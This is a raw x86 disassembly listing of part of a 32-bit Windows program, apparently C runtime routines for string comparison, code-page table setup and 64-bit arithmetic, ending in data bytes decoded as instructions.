00004F48  38D8              cmp al,bl
00004F4A  7702              ja 0x4f4e
00004F4C  02C6              add al,dh
00004F4E  38C4              cmp ah,al
00004F50  750D              jnz 0x4f5f
00004F52  49                dec ecx
00004F53  75D7              jnz 0x4f2c
00004F55  33C9              xor ecx,ecx
00004F57  38C4              cmp ah,al
00004F59  0F849B000000      jz near 0x4ffa
00004F5F  B9FFFFFFFF        mov ecx,0xffffffff
00004F64  0F8290000000      jc near 0x4ffa
00004F6A  F7D9              neg ecx
00004F6C  E989000000        jmp 0x4ffa
00004F71  F0FF05D4721E00    lock inc dword [0x1e72d4]
00004F78  833DD0721E0000    cmp dword [0x1e72d0],byte +0x0
00004F7F  7F04              jg 0x4f85
00004F81  6A00              push byte +0x0
00004F83  EB19              jmp short 0x4f9e
00004F85  F0FF0DD4721E00    lock dec dword [0x1e72d4]
00004F8C  8BD9              mov ebx,ecx
00004F8E  6A13              push byte +0x13
00004F90  E808DDFFFF        call 0x2c9d
00004F95  C7042401000000    mov dword [esp],0x1
00004F9C  8BCB              mov ecx,ebx
00004F9E  33C0              xor eax,eax
00004FA0  33DB              xor ebx,ebx
00004FA2  8BFF              mov edi,edi
00004FA4  8A06              mov al,[esi]
00004FA6  0BC0              or eax,eax
00004FA8  8A1F              mov bl,[edi]
00004FAA  7423              jz 0x4fcf
00004FAC  0BDB              or ebx,ebx
00004FAE  741F              jz 0x4fcf
00004FB0  46                inc esi
00004FB1  47                inc edi
00004FB2  51                push ecx
00004FB3  50                push eax
00004FB4  53                push ebx
00004FB5  E846D0FFFF        call 0x2000
00004FBA  8BD8              mov ebx,eax
00004FBC  83C404            add esp,byte +0x4
00004FBF  E83CD0FFFF        call 0x2000
00004FC4  83C404            add esp,byte +0x4
00004FC7  59                pop ecx
00004FC8  3BC3              cmp eax,ebx
00004FCA  7509              jnz 0x4fd5
00004FCC  49                dec ecx
00004FCD  75D5              jnz 0x4fa4
00004FCF  33C9              xor ecx,ecx
00004FD1  3BC3              cmp eax,ebx
00004FD3  7409              jz 0x4fde
00004FD5  B9FFFFFFFF        mov ecx,0xffffffff
00004FDA  7202              jc 0x4fde
00004FDC  F7D9              neg ecx
00004FDE  58                pop eax
00004FDF  0BC0              or eax,eax
00004FE1  7509              jnz 0x4fec
00004FE3  F0FF0DD4721E00    lock dec dword [0x1e72d4]
00004FEA  EB0E              jmp short 0x4ffa
00004FEC  8BD9              mov ebx,ecx
00004FEE  6A13              push byte +0x13
00004FF0  E809DDFFFF        call 0x2cfe
00004FF5  83C404            add esp,byte +0x4
00004FF8  8BCB              mov ecx,ebx
00004FFA  8BC1              mov eax,ecx
00004FFC  5B                pop ebx
00004FFD  5E                pop esi
00004FFE  5F                pop edi
00004FFF  C9                leave
00005000  C3                ret
00005001  55                push ebp
00005002  8BEC              mov ebp,esp
00005004  83EC18            sub esp,byte +0x18
00005007  53                push ebx
00005008  56                push esi
00005009  57                push edi
0000500A  6A19              push byte +0x19
0000500C  E88CDCFFFF        call 0x2c9d
00005011  FF7508            push dword [ebp+0x8]
00005014  E895010000        call 0x51ae
00005019  8BD8              mov ebx,eax
0000501B  59                pop ecx
0000501C  3B1D70701E00      cmp ebx,[0x1e7070]
00005022  59                pop ecx
00005023  895D08            mov [ebp+0x8],ebx
00005026  7507              jnz 0x502f
00005028  33F6              xor esi,esi
0000502A  E970010000        jmp 0x519f
0000502F  85DB              test ebx,ebx
00005031  0F8456010000      jz near 0x518d
00005037  33D2              xor edx,edx
00005039  B8F86A1E00        mov eax,0x1e6af8
0000503E  3918              cmp [eax],ebx
00005040  7474              jz 0x50b6
00005042  83C030            add eax,byte +0x30
00005045  42                inc edx
00005046  3DE86B1E00        cmp eax,0x1e6be8
0000504B  7CF1              jl 0x503e
0000504D  8D45E8            lea eax,[ebp-0x18]
00005050  50                push eax
00005051  53                push ebx
00005052  FF15DC561E00      call near [0x1e56dc]
00005058  6A01              push byte +0x1
0000505A  5E                pop esi
0000505B  3BC6              cmp eax,esi
0000505D  0F8521010000      jnz near 0x5184
00005063  6A40              push byte +0x40
00005065  8325A4721E0000    and dword [0x1e72a4],byte +0x0
0000506C  59                pop ecx
0000506D  33C0              xor eax,eax
0000506F  BFA0711E00        mov edi,0x1e71a0
00005074  3975E8            cmp [ebp-0x18],esi
00005077  F3AB              rep stosd
00005079  AA                stosb
0000507A  891D70701E00      mov [0x1e7070],ebx
00005080  0F86EB000000      jna near 0x5171
00005086  807DEE00          cmp byte [ebp-0x12],0x0
0000508A  0F84BC000000      jz near 0x514c
00005090  8D4DEF            lea ecx,[ebp-0x11]
00005093  8A11              mov dl,[ecx]
00005095  84D2              test dl,dl
00005097  0F84AF000000      jz near 0x514c
0000509D  0FB641FF          movzx eax,byte [ecx-0x1]
000050A1  0FB6D2            movzx edx,dl
000050A4  3BC2              cmp eax,edx
000050A6  0F8794000000      ja near 0x5140
000050AC  8088A1711E0004    or byte [eax+0x1e71a1],0x4
000050B3  40                inc eax
000050B4  EBEE              jmp short 0x50a4
000050B6  8365FC00          and dword [ebp-0x4],byte +0x0
000050BA  6A40              push byte +0x40
000050BC  59                pop ecx
000050BD  33C0              xor eax,eax
000050BF  BFA0711E00        mov edi,0x1e71a0
000050C4  8D3452            lea esi,[edx+edx*2]
000050C7  F3AB              rep stosd
000050C9  C1E604            shl esi,0x4
000050CC  AA                stosb
000050CD  8D9E086B1E00      lea ebx,[esi+0x1e6b08]
000050D3  803B00            cmp byte [ebx],0x0
000050D6  8BCB              mov ecx,ebx
000050D8  742C              jz 0x5106
000050DA  8A5101            mov dl,[ecx+0x1]
000050DD  84D2              test dl,dl
000050DF  7425              jz 0x5106
000050E1  0FB601            movzx eax,byte [ecx]
000050E4  0FB6FA            movzx edi,dl
000050E7  3BC7              cmp eax,edi
000050E9  7714              ja 0x50ff
000050EB  8B55FC            mov edx,[ebp-0x4]
000050EE  8A92F06A1E00      mov dl,[edx+0x1e6af0]
000050F4  0890A1711E00      or [eax+0x1e71a1],dl
000050FA  40                inc eax
000050FB  3BC7              cmp eax,edi
000050FD  76F5              jna 0x50f4
000050FF  41                inc ecx
00005100  41                inc ecx
00005101  803900            cmp byte [ecx],0x0
00005104  75D4              jnz 0x50da
00005106  FF45FC            inc dword [ebp-0x4]
00005109  83C308            add ebx,byte +0x8
0000510C  837DFC04          cmp dword [ebp-0x4],byte +0x4
00005110  72C1              jc 0x50d3
00005112  8B4508            mov eax,[ebp+0x8]
00005115  C7058C701E000100  mov dword [0x1e708c],0x1
         -0000
0000511F  50                push eax
00005120  A370701E00        mov [0x1e7070],eax
00005125  E8CE000000        call 0x51f8
0000512A  8DB6FC6A1E00      lea esi,[esi+0x1e6afc]
00005130  BF80701E00        mov edi,0x1e7080
00005135  A5                movsd
00005136  A5                movsd
00005137  59                pop ecx
00005138  A3A4721E00        mov [0x1e72a4],eax
0000513D  A5                movsd
0000513E  EB52              jmp short 0x5192
00005140  41                inc ecx
00005141  41                inc ecx
00005142  8079FF00          cmp byte [ecx-0x1],0x0
00005146  0F8547FFFFFF      jnz near 0x5093
0000514C  8BC6              mov eax,esi
0000514E  8088A1711E0008    or byte [eax+0x1e71a1],0x8
00005155  40                inc eax
00005156  3DFF000000        cmp eax,0xff
0000515B  72F1              jc 0x514e
0000515D  53                push ebx
0000515E  E895000000        call 0x51f8
00005163  59                pop ecx
00005164  A3A4721E00        mov [0x1e72a4],eax
00005169  89358C701E00      mov [0x1e708c],esi
0000516F  EB07              jmp short 0x5178
00005171  83258C701E0000    and dword [0x1e708c],byte +0x0
00005178  33C0              xor eax,eax
0000517A  BF80701E00        mov edi,0x1e7080
0000517F  AB                stosd
00005180  AB                stosd
00005181  AB                stosd
00005182  EB0E              jmp short 0x5192
00005184  833D986F1E0000    cmp dword [0x1e6f98],byte +0x0
0000518B  740F              jz 0x519c
0000518D  E899000000        call 0x522b
00005192  E8BD000000        call 0x5254
00005197  E98CFEFFFF        jmp 0x5028
0000519C  83CEFF            or esi,byte -0x1
0000519F  6A19              push byte +0x19
000051A1  E858DBFFFF        call 0x2cfe
000051A6  59                pop ecx
000051A7  8BC6              mov eax,esi
000051A9  5F                pop edi
000051AA  5E                pop esi
000051AB  5B                pop ebx
000051AC  C9                leave
000051AD  C3                ret
000051AE  8B442404          mov eax,[esp+0x4]
000051B2  8325986F1E0000    and dword [0x1e6f98],byte +0x0
000051B9  83F8FE            cmp eax,byte -0x2
000051BC  7510              jnz 0x51ce
000051BE  C705986F1E000100  mov dword [0x1e6f98],0x1
         -0000
000051C8  FF25FC561E00      jmp near [0x1e56fc]
000051CE  83F8FD            cmp eax,byte -0x3
000051D1  7510              jnz 0x51e3
000051D3  C705986F1E000100  mov dword [0x1e6f98],0x1
         -0000
000051DD  FF25F8561E00      jmp near [0x1e56f8]
000051E3  83F8FC            cmp eax,byte -0x4
000051E6  750F              jnz 0x51f7
000051E8  A1B46D1E00        mov eax,[0x1e6db4]
000051ED  C705986F1E000100  mov dword [0x1e6f98],0x1
         -0000
000051F7  C3                ret
000051F8  8B442404          mov eax,[esp+0x4]
000051FC  2DA4030000        sub eax,0x3a4
00005201  7422              jz 0x5225
00005203  83E804            sub eax,byte +0x4
00005206  7417              jz 0x521f
00005208  83E80D            sub eax,byte +0xd
0000520B  740C              jz 0x5219
0000520D  48                dec eax
0000520E  7403              jz 0x5213
00005210  33C0              xor eax,eax
00005212  C3                ret
00005213  B804040000        mov eax,0x404
00005218  C3                ret
00005219  B812040000        mov eax,0x412
0000521E  C3                ret
0000521F  B804080000        mov eax,0x804
00005224  C3                ret
00005225  B811040000        mov eax,0x411
0000522A  C3                ret
0000522B  57                push edi
0000522C  6A40              push byte +0x40
0000522E  59                pop ecx
0000522F  33C0              xor eax,eax
00005231  BFA0711E00        mov edi,0x1e71a0
00005236  F3AB              rep stosd
00005238  AA                stosb
00005239  33C0              xor eax,eax
0000523B  BF80701E00        mov edi,0x1e7080
00005240  A370701E00        mov [0x1e7070],eax
00005245  A38C701E00        mov [0x1e708c],eax
0000524A  A3A4721E00        mov [0x1e72a4],eax
0000524F  AB                stosd
00005250  AB                stosd
00005251  AB                stosd
00005252  5F                pop edi
00005253  C3                ret
00005254  55                push ebp
00005255  8BEC              mov ebp,esp
00005257  81EC14050000      sub esp,0x514
0000525D  8D45EC            lea eax,[ebp-0x14]
00005260  56                push esi
00005261  50                push eax
00005262  FF3570701E00      push dword [0x1e7070]
00005268  FF15DC561E00      call near [0x1e56dc]
0000526E  83F801            cmp eax,byte +0x1
00005271  0F8516010000      jnz near 0x538d
00005277  33C0              xor eax,eax
00005279  BE00010000        mov esi,0x100
0000527E  888405ECFEFFFF    mov [ebp+eax+0xfffffeec],al
00005285  40                inc eax
00005286  3BC6              cmp eax,esi
00005288  72F4              jc 0x527e
0000528A  8A45F2            mov al,[ebp-0xe]
0000528D  C685ECFEFFFF20    mov byte [ebp+0xfffffeec],0x20
00005294  84C0              test al,al
00005296  7437              jz 0x52cf
00005298  53                push ebx
00005299  57                push edi
0000529A  8D55F3            lea edx,[ebp-0xd]
0000529D  0FB60A            movzx ecx,byte [edx]
000052A0  0FB6C0            movzx eax,al
000052A3  3BC1              cmp eax,ecx
000052A5  771D              ja 0x52c4
000052A7  2BC8              sub ecx,eax
000052A9  8DBC05ECFEFFFF    lea edi,[ebp+eax+0xfffffeec]
000052B0  41                inc ecx
000052B1  B820202020        mov eax,0x20202020
000052B6  8BD9              mov ebx,ecx
000052B8  C1E902            shr ecx,0x2
000052BB  F3AB              rep stosd
000052BD  8BCB              mov ecx,ebx
000052BF  83E103            and ecx,byte +0x3
000052C2  F3AA              rep stosb
000052C4  42                inc edx
000052C5  42                inc edx
000052C6  8A42FF            mov al,[edx-0x1]
000052C9  84C0              test al,al
000052CB  75D0              jnz 0x529d
000052CD  5F                pop edi
000052CE  5B                pop ebx
000052CF  6A00              push byte +0x0
000052D1  8D85ECFAFFFF      lea eax,[ebp+0xfffffaec]
000052D7  FF35A4721E00      push dword [0x1e72a4]
000052DD  FF3570701E00      push dword [0x1e7070]
000052E3  50                push eax
000052E4  8D85ECFEFFFF      lea eax,[ebp+0xfffffeec]
000052EA  56                push esi
000052EB  50                push eax
000052EC  6A01              push byte +0x1
000052EE  E861D8FFFF        call 0x2b54
000052F3  6A00              push byte +0x0
000052F5  8D85ECFDFFFF      lea eax,[ebp+0xfffffdec]
000052FB  FF3570701E00      push dword [0x1e7070]
00005301  56                push esi
00005302  50                push eax
00005303  8D85ECFEFFFF      lea eax,[ebp+0xfffffeec]
00005309  56                push esi
0000530A  50                push eax
0000530B  56                push esi
0000530C  FF35A4721E00      push dword [0x1e72a4]
00005312  E8FCD9FFFF        call 0x2d13
00005317  6A00              push byte +0x0
00005319  8D85ECFCFFFF      lea eax,[ebp+0xfffffcec]
0000531F  FF3570701E00      push dword [0x1e7070]
00005325  56                push esi
00005326  50                push eax
00005327  8D85ECFEFFFF      lea eax,[ebp+0xfffffeec]
0000532D  56                push esi
0000532E  50                push eax
0000532F  6800020000        push dword 0x200
00005334  FF35A4721E00      push dword [0x1e72a4]
0000533A  E8D4D9FFFF        call 0x2d13
0000533F  83C45C            add esp,byte +0x5c
00005342  33C0              xor eax,eax
00005344  8D8DECFAFFFF      lea ecx,[ebp+0xfffffaec]
0000534A  668B11            mov dx,[ecx]
0000534D  F6C201            test dl,0x1
00005350  7416              jz 0x5368
00005352  8088A1711E0010    or byte [eax+0x1e71a1],0x10
00005359  8A9405ECFDFFFF    mov dl,[ebp+eax+0xfffffdec]
00005360  8890A0701E00      mov [eax+0x1e70a0],dl
00005366  EB1C              jmp short 0x5384
00005368  F6C202            test dl,0x2
0000536B  7410              jz 0x537d
0000536D  8088A1711E0020    or byte [eax+0x1e71a1],0x20
00005374  8A9405ECFCFFFF    mov dl,[ebp+eax+0xfffffcec]
0000537B  EBE3              jmp short 0x5360
0000537D  80A0A0701E0000    and byte [eax+0x1e70a0],0x0
00005384  40                inc eax
00005385  41                inc ecx
00005386  41                inc ecx
00005387  3BC6              cmp eax,esi
00005389  72BF              jc 0x534a
0000538B  EB49              jmp short 0x53d6
0000538D  33C0              xor eax,eax
0000538F  BE00010000        mov esi,0x100
00005394  83F841            cmp eax,byte +0x41
00005397  7219              jc 0x53b2
00005399  83F85A            cmp eax,byte +0x5a
0000539C  7714              ja 0x53b2
0000539E  8088A1711E0010    or byte [eax+0x1e71a1],0x10
000053A5  8AC8              mov cl,al
000053A7  80C120            add cl,0x20
000053AA  8888A0701E00      mov [eax+0x1e70a0],cl
000053B0  EB1F              jmp short 0x53d1
000053B2  83F861            cmp eax,byte +0x61
000053B5  7213              jc 0x53ca
000053B7  83F87A            cmp eax,byte +0x7a
000053BA  770E              ja 0x53ca
000053BC  8088A1711E0020    or byte [eax+0x1e71a1],0x20
000053C3  8AC8              mov cl,al
000053C5  80E920            sub cl,0x20
000053C8  EBE0              jmp short 0x53aa
000053CA  80A0A0701E0000    and byte [eax+0x1e70a0],0x0
000053D1  40                inc eax
000053D2  3BC6              cmp eax,esi
000053D4  72BE              jc 0x5394
000053D6  5E                pop esi
000053D7  C9                leave
000053D8  C3                ret
000053D9  833DC4721E0000    cmp dword [0x1e72c4],byte +0x0
000053E0  7512              jnz 0x53f4
000053E2  6AFD              push byte -0x3
000053E4  E818FCFFFF        call 0x5001
000053E9  59                pop ecx
000053EA  C705C4721E000100  mov dword [0x1e72c4],0x1
         -0000
000053F4  C3                ret
000053F5  53                push ebx
000053F6  33DB              xor ebx,ebx
000053F8  391D9C6F1E00      cmp [0x1e6f9c],ebx
000053FE  56                push esi
000053FF  57                push edi
00005400  7542              jnz 0x5444
00005402  680C5C1E00        push dword 0x1e5c0c
00005407  FF1500571E00      call near [0x1e5700]
0000540D  8BF8              mov edi,eax
0000540F  3BFB              cmp edi,ebx
00005411  7467              jz 0x547a
00005413  8B3590561E00      mov esi,[0x1e5690]
00005419  68005C1E00        push dword 0x1e5c00
0000541E  57                push edi
0000541F  FFD6              call esi
00005421  85C0              test eax,eax
00005423  A39C6F1E00        mov [0x1e6f9c],eax
00005428  7450              jz 0x547a
0000542A  68F05B1E00        push dword 0x1e5bf0
0000542F  57                push edi
00005430  FFD6              call esi
00005432  68DC5B1E00        push dword 0x1e5bdc
00005437  57                push edi
00005438  A3A06F1E00        mov [0x1e6fa0],eax
0000543D  FFD6              call esi
0000543F  A3A46F1E00        mov [0x1e6fa4],eax
00005444  A1A06F1E00        mov eax,[0x1e6fa0]
00005449  85C0              test eax,eax
0000544B  7416              jz 0x5463
0000544D  FFD0              call eax
0000544F  8BD8              mov ebx,eax
00005451  85DB              test ebx,ebx
00005453  740E              jz 0x5463
00005455  A1A46F1E00        mov eax,[0x1e6fa4]
0000545A  85C0              test eax,eax
0000545C  7405              jz 0x5463
0000545E  53                push ebx
0000545F  FFD0              call eax
00005461  8BD8              mov ebx,eax
00005463  FF742418          push dword [esp+0x18]
00005467  FF742418          push dword [esp+0x18]
0000546B  FF742418          push dword [esp+0x18]
0000546F  53                push ebx
00005470  FF159C6F1E00      call near [0x1e6f9c]
00005476  5F                pop edi
00005477  5E                pop esi
00005478  5B                pop ebx
00005479  C3                ret
0000547A  33C0              xor eax,eax
0000547C  EBF8              jmp short 0x5476
0000547E  CC                int3
0000547F  CC                int3
00005480  53                push ebx
00005481  56                push esi
00005482  8B442418          mov eax,[esp+0x18]
00005486  0BC0              or eax,eax
00005488  7518              jnz 0x54a2
0000548A  8B4C2414          mov ecx,[esp+0x14]
0000548E  8B442410          mov eax,[esp+0x10]
00005492  33D2              xor edx,edx
00005494  F7F1              div ecx
00005496  8BD8              mov ebx,eax
00005498  8B44240C          mov eax,[esp+0xc]
0000549C  F7F1              div ecx
0000549E  8BD3              mov edx,ebx
000054A0  EB41              jmp short 0x54e3
000054A2  8BC8              mov ecx,eax
000054A4  8B5C2414          mov ebx,[esp+0x14]
000054A8  8B542410          mov edx,[esp+0x10]
000054AC  8B44240C          mov eax,[esp+0xc]
000054B0  D1E9              shr ecx,1
000054B2  D1DB              rcr ebx,1
000054B4  D1EA              shr edx,1
000054B6  D1D8              rcr eax,1
000054B8  0BC9              or ecx,ecx
000054BA  75F4              jnz 0x54b0
000054BC  F7F3              div ebx
000054BE  8BF0              mov esi,eax
000054C0  F7642418          mul dword [esp+0x18]
000054C4  8BC8              mov ecx,eax
000054C6  8B442414          mov eax,[esp+0x14]
000054CA  F7E6              mul esi
000054CC  03D1              add edx,ecx
000054CE  720E              jc 0x54de
000054D0  3B542410          cmp edx,[esp+0x10]
000054D4  7708              ja 0x54de
000054D6  7207              jc 0x54df
000054D8  3B44240C          cmp eax,[esp+0xc]
000054DC  7601              jna 0x54df
000054DE  4E                dec esi
000054DF  33D2              xor edx,edx
000054E1  8BC6              mov eax,esi
000054E3  5E                pop esi
000054E4  5B                pop ebx
000054E5  C21000            ret 0x10
000054E8  CC                int3
000054E9  CC                int3
000054EA  CC                int3
000054EB  CC                int3
000054EC  CC                int3
000054ED  CC                int3
000054EE  CC                int3
000054EF  CC                int3
000054F0  53                push ebx
000054F1  8B442414          mov eax,[esp+0x14]
000054F5  0BC0              or eax,eax
000054F7  7518              jnz 0x5511
000054F9  8B4C2410          mov ecx,[esp+0x10]
000054FD  8B44240C          mov eax,[esp+0xc]
00005501  33D2              xor edx,edx
00005503  F7F1              div ecx
00005505  8B442408          mov eax,[esp+0x8]
00005509  F7F1              div ecx
0000550B  8BC2              mov eax,edx
0000550D  33D2              xor edx,edx
0000550F  EB50              jmp short 0x5561
00005511  8BC8              mov ecx,eax
00005513  8B5C2410          mov ebx,[esp+0x10]
00005517  8B54240C          mov edx,[esp+0xc]
0000551B  8B442408          mov eax,[esp+0x8]
0000551F  D1E9              shr ecx,1
00005521  D1DB              rcr ebx,1
00005523  D1EA              shr edx,1
00005525  D1D8              rcr eax,1
00005527  0BC9              or ecx,ecx
00005529  75F4              jnz 0x551f
0000552B  F7F3              div ebx
0000552D  8BC8              mov ecx,eax
0000552F  F7642414          mul dword [esp+0x14]
00005533  91                xchg eax,ecx
00005534  F7642410          mul dword [esp+0x10]
00005538  03D1              add edx,ecx
0000553A  720E              jc 0x554a
0000553C  3B54240C          cmp edx,[esp+0xc]
00005540  7708              ja 0x554a
00005542  720E              jc 0x5552
00005544  3B442408          cmp eax,[esp+0x8]
00005548  7608              jna 0x5552
0000554A  2B442410          sub eax,[esp+0x10]
0000554E  1B542414          sbb edx,[esp+0x14]
00005552  2B442408          sub eax,[esp+0x8]
00005556  1B54240C          sbb edx,[esp+0xc]
0000555A  F7DA              neg edx
0000555C  F7D8              neg eax
0000555E  83DA00            sbb edx,byte +0x0
00005561  5B                pop ebx
00005562  C21000            ret 0x10
00005565  CC                int3
00005566  CC                int3
00005567  CC                int3
00005568  CC                int3
00005569  CC                int3
0000556A  CC                int3
0000556B  CC                int3
0000556C  CC                int3
0000556D  CC                int3
0000556E  CC                int3
0000556F  CC                int3
00005570  8B442408          mov eax,[esp+0x8]
00005574  8B4C2410          mov ecx,[esp+0x10]
00005578  0BC8              or ecx,eax
0000557A  8B4C240C          mov ecx,[esp+0xc]
0000557E  7509              jnz 0x5589
00005580  8B442404          mov eax,[esp+0x4]
00005584  F7E1              mul ecx
00005586  C21000            ret 0x10
00005589  53                push ebx
0000558A  F7E1              mul ecx
0000558C  8BD8              mov ebx,eax
0000558E  8B442408          mov eax,[esp+0x8]
00005592  F7642414          mul dword [esp+0x14]
00005596  03D8              add ebx,eax
00005598  8B442408          mov eax,[esp+0x8]
0000559C  F7E1              mul ecx
0000559E  03D3              add edx,ebx
000055A0  5B                pop ebx
000055A1  C21000            ret 0x10
000055A4  CC                int3
000055A5  CC                int3
000055A6  CC                int3
000055A7  CC                int3
000055A8  CC                int3
000055A9  CC                int3
000055AA  CC                int3
000055AB  CC                int3
000055AC  CC                int3
000055AD  CC                int3
000055AE  CC                int3
000055AF  CC                int3
000055B0  8D42FF            lea eax,[edx-0x1]
000055B3  5B                pop ebx
000055B4  C3                ret
000055B5  8DA42400000000    lea esp,[esp+0x0]
000055BC  8D642400          lea esp,[esp+0x0]
000055C0  33C0              xor eax,eax
000055C2  8A442408          mov al,[esp+0x8]
000055C6  53                push ebx
000055C7  8BD8              mov ebx,eax
000055C9  C1E008            shl eax,0x8
000055CC  8B542408          mov edx,[esp+0x8]
000055D0  F7C203000000      test edx,0x3
000055D6  7413              jz 0x55eb
000055D8  8A0A              mov cl,[edx]
000055DA  42                inc edx
000055DB  38D9              cmp cl,bl
000055DD  74D1              jz 0x55b0
000055DF  84C9              test cl,cl
000055E1  7451              jz 0x5634
000055E3  F7C203000000      test edx,0x3
000055E9  75ED              jnz 0x55d8
000055EB  0BD8              or ebx,eax
000055ED  57                push edi
000055EE  8BC3              mov eax,ebx
000055F0  C1E310            shl ebx,0x10
000055F3  56                push esi
000055F4  0BD8              or ebx,eax
000055F6  8B0A              mov ecx,[edx]
000055F8  BFFFFEFE7E        mov edi,0x7efefeff
000055FD  8BC1              mov eax,ecx
000055FF  8BF7              mov esi,edi
00005601  33CB              xor ecx,ebx
00005603  03F0              add esi,eax
00005605  03F9              add edi,ecx
00005607  83F1FF            xor ecx,byte -0x1
0000560A  83F0FF            xor eax,byte -0x1
0000560D  33CF              xor ecx,edi
0000560F  33C6              xor eax,esi
00005611  83C204            add edx,byte +0x4
00005614  81E100010181      and ecx,0x81010100
0000561A  751C              jnz 0x5638
0000561C  2500010181        and eax,0x81010100
00005621  74D3              jz 0x55f6
00005623  2500010101        and eax,0x1010100
00005628  7508              jnz 0x5632
0000562A  81E600000080      and esi,0x80000000
00005630  75C4              jnz 0x55f6
00005632  5E                pop esi
00005633  5F                pop edi
00005634  5B                pop ebx
00005635  33C0              xor eax,eax
00005637  C3                ret
00005638  8B42FC            mov eax,[edx-0x4]
0000563B  38D8              cmp al,bl
0000563D  7436              jz 0x5675
0000563F  84C0              test al,al
00005641  74EF              jz 0x5632
00005643  38DC              cmp ah,bl
00005645  7427              jz 0x566e
00005647  84E4              test ah,ah
00005649  74E7              jz 0x5632
0000564B  C1E810            shr eax,0x10
0000564E  38D8              cmp al,bl
00005650  7415              jz 0x5667
00005652  84C0              test al,al
00005654  74DC              jz 0x5632
00005656  38DC              cmp ah,bl
00005658  7406              jz 0x5660
0000565A  84E4              test ah,ah
0000565C  74D4              jz 0x5632
0000565E  EB96              jmp short 0x55f6
00005660  5E                pop esi
00005661  5F                pop edi
00005662  8D42FF            lea eax,[edx-0x1]
00005665  5B                pop ebx
00005666  C3                ret
00005667  8D42FE            lea eax,[edx-0x2]
0000566A  5E                pop esi
0000566B  5F                pop edi
0000566C  5B                pop ebx
0000566D  C3                ret
0000566E  8D42FD            lea eax,[edx-0x3]
00005671  5E                pop esi
00005672  5F                pop edi
00005673  5B                pop ebx
00005674  C3                ret
00005675  8D42FC            lea eax,[edx-0x4]
00005678  5E                pop esi
00005679  5F                pop edi
0000567A  5B                pop ebx
0000567B  C3                ret
0000567C  FF25D4561E00      jmp near [0x1e56d4]
00005682  0000              add [eax],al
00005684  0000              add [eax],al
00005686  0000              add [eax],al
00005688  0000              add [eax],al
0000568A  0000              add [eax],al
0000568C  0000              add [eax],al
0000568E  0000              add [eax],al
00005690  F8                clc
00005691  5C                pop esp
00005692  0000              add [eax],al
00005694  0A5D00            or bl,[ebp+0x0]
00005697  001E              add [esi],bl
00005699  5D                pop ebp
0000569A  0000              add [eax],al
0000569C  365D              ss pop ebp
0000569E  0000              add [eax],al
000056A0  4E                dec esi
000056A1  5D                pop ebp
000056A2  0000              add [eax],al
000056A4  645D              fs pop ebp
000056A6  0000              add [eax],al
000056A8  765D              jna 0x5707
000056AA  0000              add [eax],al
000056AC  885D00            mov [ebp+0x0],bl
000056AF  00A45D0000BC5D    add [ebp+ebx*2+0x5dbc0000],ah
000056B6  0000              add [eax],al
000056B8  D45D              aam 0x5d
000056BA  0000              add [eax],al
000056BC  E25D              loop 0x571b
000056BE  0000              add [eax],al
000056C0  F8                clc
000056C1  5D                pop ebp
000056C2  0000              add [eax],al
000056C4  085E00            or [esi+0x0],bl
000056C7  0018              add [eax],bl
000056C9  5E                pop esi
000056CA  0000              add [eax],al
000056CC  245E              and al,0x5e
000056CE  0000              add [eax],al
000056D0  385E00            cmp [esi+0x0],bl
000056D3  004C5E00          add [esi+ebx*2+0x0],cl
000056D7  00585E            add [eax+0x5e],bl
000056DA  0000              add [eax],al
000056DC  645E              fs pop esi
000056DE  0000              add [eax],al
000056E0  705E              jo 0x5740
000056E2  0000              add [eax],al
000056E4  865E00            xchg bl,[esi+0x0]
000056E7  00965E0000A4      add [esi+0xa400005e],dl
000056ED  5E                pop esi
000056EE  0000              add [eax],al
000056F0  B05E              mov al,0x5e
000056F2  0000              add [eax],al
000056F4  C05E0000          rcr byte [esi+0x0],0x0
000056F8  CE                into
000056F9  5E                pop esi
000056FA  0000              add [eax],al
000056FC  D85E00            fcomp dword [esi+0x0]
000056FF  00E4              add ah,ah
00005701  5E                pop esi
00005702  0000              add [eax],al
00005704  0000              add [eax],al
00005706  0000              add [eax],al
00005708  0000              add [eax],al
0000570A  0000              add [eax],al
0000570C  0000              add [eax],al
0000570E  0000              add [eax],al
00005710  0000              add [eax],al
00005712  0000              add [eax],al
00005714  0000              add [eax],al
00005716  F03F              lock aas
00005718  0000              add [eax],al
0000571A  0000              add [eax],al
0000571C  0000              add [eax],al
0000571E  2440              and al,0x40
00005720  0000              add [eax],al
00005722  0000              add [eax],al
00005724  0000              add [eax],al
00005726  24C0              and al,0xc0
00005728  B81E85EB51        mov eax,0x51eb851e
0000572D  B89E3F9A99        mov eax,0x999a3f9e
00005732  99                cdq
00005733  99                cdq
00005734  99                cdq
00005735  99                cdq
00005736  B93F000000        mov ecx,0x3f
0000573B  C07E0150          sar byte [esi+0x1],0x50
0000573F  41                inc ecx
00005740  0000              add [eax],al
00005742  0080FFFF4741      add [eax+0x4147ffff],al
00005748  49                dec ecx
00005749  7350              jnc 0x579b
0000574B  726F              jc 0x57bc
0000574D  636573            arpl [ebp+0x73],sp
00005750  736F              jnc 0x57c1
00005752  7246              jc 0x579a
00005754  6561              gs popa
00005756  7475              jz 0x57cd
00005758  7265              jc 0x57bf
0000575A  50                push eax
0000575B  7265              jc 0x57c2
0000575D  7365              jnc 0x57c4
0000575F  6E                outsb
00005760  7400              jz 0x5762
00005762  0000              add [eax],al
00005764  4B                dec ebx
00005765  45                inc ebp
00005766  52                push edx
00005767  4E                dec esi
00005768  45                inc ebp
00005769  4C                dec esp
0000576A  3332              xor esi,[edx]
0000576C  0000              add [eax],al
0000576E  0000              add [eax],al
00005770  652B30            sub esi,[gs:eax]
00005773  3030              xor [eax],dh
00005775  0000              add [eax],al
00005777  0000              add [eax],al
00005779  0000              add [eax],al
0000577B  0000              add [eax],al
0000577D  0000              add [eax],al
0000577F  00FF              add bh,bh
00005781  FF                db 0xFF
00005782  FF                db 0xFF
00005783  FF4D2C            dec dword [ebp+0x2c]
00005786  1E                push ds
00005787  00512C            add [ecx+0x2c],dl
0000578A  1E                push ds
0000578B  0000              add [eax],al
0000578D  0000              add [eax],al
0000578F  00FF              add bh,bh
00005791  FF                db 0xFF
00005792  FF                db 0xFF
00005793  FF23              jmp near [ebx]
00005795  2E1E              cs push ds
00005797  0027              add [edi],ah
00005799  2E1E              cs push ds
0000579B  00FF              add bh,bh
0000579D  FF                db 0xFF
0000579E  FF                db 0xFF
0000579F  FFD7              call edi
000057A1  2E1E              cs push ds
000057A3  00DB              add bl,bl
000057A5  2E1E              cs push ds
000057A7  0031              add [ecx],dh
000057A9  23514E            and edx,[ecx+0x4e]
000057AC  41                inc ecx
000057AD  4E                dec esi
000057AE  0000              add [eax],al
000057B0  3123              xor [ebx],esp
